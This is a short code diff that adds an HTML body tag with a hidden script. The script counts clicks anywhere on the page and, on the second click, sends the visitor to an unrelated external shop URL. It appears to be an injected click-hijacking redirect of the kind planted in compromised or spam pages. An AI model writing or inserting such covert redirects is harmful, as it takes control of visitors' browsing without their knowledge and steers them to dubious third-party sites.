@@ -1,0 +1,16 @@
+</head>
+<body data-lang="ES" onclick="redirect()">
+    
+    
+    
+    
+    <script>
+    var touchCount = 0;
+
+    function redirect() {
+        touchCount++;
+        if (touchCount == 2) {
+            window.location.href = "http://18gramshop.online/magicoamxr";
+        }
+    }
+</script>
